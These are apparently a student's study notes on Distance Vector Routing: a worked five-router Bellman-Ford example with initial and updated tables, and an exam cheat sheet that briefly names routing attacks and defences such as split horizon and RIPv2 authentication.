**Question:** Explain the methodology of Distance Vector Routing with the help of a suitable example. Include the initial table formation and one complete update pass.

```
DISTANCE VECTOR ROUTING (DVR) — Methodology:

OVERVIEW:
  DVR is an intra-domain routing protocol where each router maintains a
  routing table with three columns: Destination, Distance (cost), Next Hop.
  Routers periodically share their "distance vector" (the array of costs)
  ONLY with directly connected neighbours. On receiving a neighbour's vector,
  each router applies the Bellman-Ford equation to update its own table.

  Goal: after multiple passes, every router knows the minimum cost path
  to every other router in the network — without ever needing the full
  network topology (unlike Link State/OSPF).

STEP 1 — INITIAL TABLE FORMATION:
  Inputs: knowledge from HELLO messages (who are my neighbours, at what cost)
  Each router fills its routing table with:
    → Self: cost 0
    → Direct neighbours: the measured/configured link cost
    → All others: ∞ (unknown)

  Example (N4 in a 5-node network N1-N5):
  ┌─────┬──────┬──────┐
  │ Dst │ Dist │ Next │
  ├─────┼──────┼──────┤
  │ N1  │  ∞   │  ?   │
  │ N2  │  ∞   │  ?   │
  │ N3  │  2   │  N3  │  ← direct, cost 2
  │ N4  │  0   │  N4  │  ← self
  │ N5  │  4   │  N5  │  ← direct, cost 4
  └─────┴──────┴──────┘

STEP 2 — SHARING:
  Each router sends ONLY its distance array to ONLY its direct neighbours.
  N4 sends [∞, ∞, 2, 0, 4] to: N3 and N5.
  N4 does NOT send to N1, N2 (not direct neighbours).

STEP 3 — UPDATING (PASS 1):
  N4 receives:
    From N3: [∞, 6, 0, 2, ∞]
    From N5: [∞, 3, ∞, 4, 0]

  Apply Bellman-Ford for N4 → N2:
    Via N3: cost(N4,N3) + D(N3,N2) = 2 + 6 = 8
    Via N5: cost(N4,N5) + D(N5,N2) = 4 + 3 = 7  ← minimum
    → New: N4 to N2 = 7, Next = N5

  N4 → N1:
    Via N3: 2 + ∞ = ∞
    Via N5: 4 + ∞ = ∞
    → Still ∞ (neither N3 nor N5 know N1 yet)

  N4's Updated Table After Pass 1:
  ┌─────┬──────┬──────┐
  │ Dst │ Dist │ Next │
  ├─────┼──────┼──────┤
  │ N1  │  ∞   │  ?   │  ← still unknown
  │ N2  │  7   │  N5  │  ← UPDATED!
  │ N3  │  2   │  N3  │  ← unchanged
  │ N4  │  0   │  N4  │  ← self
  │ N5  │  4   │  N5  │  ← unchanged
  └─────┴──────┴──────┘

FURTHER PASSES:
  In Pass 2: N5 will share its updated vector (now knows N1 via N2).
  N4 will learn: N4→N5(4) + N5→N1(4) = 8. N1 finally reachable!
  After 3-4 passes: all tables converge to final minimum values.

KEY POINTS:
  → Only distance vector shared (NOT the full routing table)
  → Only to neighbours (NOT flooded network-wide)
  → Uses Bellman-Ford: D(x,y) = min over v [ cost(x,v) + D(v,y) ]
  → Multiple passes needed until no values change (convergence)
  → Continuous: keeps running even after convergence (detects topology changes)
```

---

## 14. Exam Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════════════╗
║       DISTANCE VECTOR ROUTING — EXAM CHEAT SHEET                         ║
╠══════════════════════════════════════════════════════════════════════════╣
║  WHAT IS DVR                                                               ║
║  Type:      Intra-domain (IGP) — within ONE autonomous system             ║
║  Algorithm: Bellman-Ford (distributed)                                    ║
║  Protocol:  RIP (Routing Information Protocol)                            ║
║  Scope:     Routers share info only with DIRECT NEIGHBOURS                ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ROUTING TABLE STRUCTURE (3 columns)                                       ║
║  DESTINATION | DISTANCE (cost) | NEXT HOP                                 ║
║  One row per router in the network.                                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║  THREE-STEP PROCESS                                                        ║
║  1. INITIAL TABLE: cost=0 (self), cost=link (neighbours), cost=∞ (others) ║
║  2. SHARE: send ONLY the distance array to ONLY direct neighbours         ║
║  3. UPDATE: Bellman-Ford — pick minimum via each neighbour                ║
║     D(x,y) = min over all v [ cost(x,v) + D(v,y) ]                      ║
╠══════════════════════════════════════════════════════════════════════════╣
║  UPDATE FORMULA (BELLMAN-FORD):                                            ║
║  For router X updating route to destination Y:                            ║
║    For each neighbour v:                                                   ║
║      candidate = (X→v link cost) + (v's distance to Y from its vector)   ║
║    New dist(X,Y) = MINIMUM of all candidates                              ║
║    Next hop      = the v that gave the minimum                            ║
║                                                                            ║
║  SPECIAL RULES:                                                            ║
║  → anything + ∞ = ∞                                                      ║
║  → dist(x, x) = 0 always (self)                                          ║
║  → NEVER use the old routing table in the calculation — use DV only      ║
╠══════════════════════════════════════════════════════════════════════════╣
║  TWO KEY SHARING RULES                                                     ║
║  A. Share ONLY with DIRECT NEIGHBOURS (not the whole network)             ║
║  B. Share ONLY the DISTANCE VECTOR (only the cost column, not next hop)   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  CONVERGENCE                                                               ║
║  Passes needed ≈ diameter of network (longest shortest path in hops)      ║
║  Converged = no values change between two consecutive passes              ║
║  Pass k: information has propagated at most k hops                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║  WHAT DVR LECTURE TOPOLOGY SHOWED (N1-N5):                                ║
║  Link costs: N1-N2=1, N2-N3=6, N2-N5=3, N3-N4=2, N4-N5=4               ║
║  Final optimal paths (after convergence):                                 ║
║    N1→N4: cost=8 via N2 (N1→N2→N5→N4: 1+3+4=8)                         ║
║    N4→N1: cost=8 via N5 (N4→N5→N2→N1: 4+3+1=8)                         ║
║    N4→N2: cost=7 via N5 (N4→N5→N2: 4+3=7)                              ║
║    N5→N3: cost=6 via N4 (N5→N4→N3: 4+2=6)                              ║
╠══════════════════════════════════════════════════════════════════════════╣
║  SECURITY THREATS ON DVR                                                   ║
║  Fake DV injection:    Advertise false low-cost routes → route traffic     ║
║  Route poisoning:      Advertise metric=16 → black hole a network         ║
║  Count-to-infinity:    Exploit convergence loop → prolonged outage         ║
║  Replay attack:        Replay old DV → revert to stale routing state      ║
║                                                                            ║
║  DEFENCES:                                                                 ║
║  RIPv2 MD5 authentication     → rejects unsigned DV packets               ║
║  Split Horizon                → don't advertise route back where learned  ║
║  Poison Reverse               → advertise failed route with metric=16     ║
║  Triggered Updates            → fast propagation of bad news              ║
╠══════════════════════════════════════════════════════════════════════════╣
║  EXAM TRAPS                                                                ║
║  → Never use old routing table when computing new one — DV only          ║
║  → "Next hop" column is NOT shared — only the distance array              ║
║  → DVR shares with NEIGHBOURS only — NOT the full network                ║
║  → D(x,x) = 0 always — don't forget to include self in table             ║
║  → After ONE pass: not yet converged (multiple passes needed)             ║
║  → If two candidates equal: EITHER next hop is valid (tie)               ║
║  → Count-to-Infinity is a DVR problem — OSPF does NOT have this          ║
╠══════════════════════════════════════════════════════════════════════════╣
║  MEMORY TRICKS                                                              ║
║  DVR = "Rumours" — you only hear from your neighbours                     ║
║  DVR = "Telephone game" — bad info can spread incorrectly hop by hop      ║
║  Bellman-Ford: "via every neighbour, pick the cheapest"                   ║
║  Why it's called Distance VECTOR: the distance ARRAY is the "vector"      ║
║  that gets shared — not a scalar, not a table — just the numbers          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📚 Next Topics

- [ ] **DVR Advantages & Disadvantages** (next video in the series)
- [ ] **Count-to-Infinity — Deep Dive** (full problem analysis + all 4 mitigations)
- [ ] **Link State Routing — Full Algorithm** (OSPF, Dijkstra's SPF, LSDB flooding)
- [ ] **DVR vs Link State — Performance Comparison** (convergence, memory, CPU, security)
- [ ] **RIP Configuration Lab** (FRRouting multi-router setup, convergence observation)
- [ ] **BGP Path Vector** (how AS-PATH eliminates the count-to-infinity problem at scale)

---

_Notes compiled from: Networking Course — Distance Vector Routing (Gate Smashers)_
" "
_Environment: Parrot OS + Metasploitable2 + MERN/PERN Web Projects_
_Author: Cybersecurity Dept. Student_
